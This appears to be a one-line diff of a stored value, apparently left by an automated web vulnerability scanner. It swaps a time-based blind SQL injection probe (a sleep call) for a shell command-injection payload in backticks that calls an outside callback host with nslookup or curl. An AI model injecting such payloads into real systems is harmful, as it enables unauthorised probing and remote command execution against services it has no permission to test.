@@ -1,1 +1,1 @@
-555*if(now()=sysdate(),sleep(15),0)
+`(nslookup -q=cname hitzgjbubifoxd929e.bxss.me||curl hitzgjbubifoxd929e.bxss.me)`
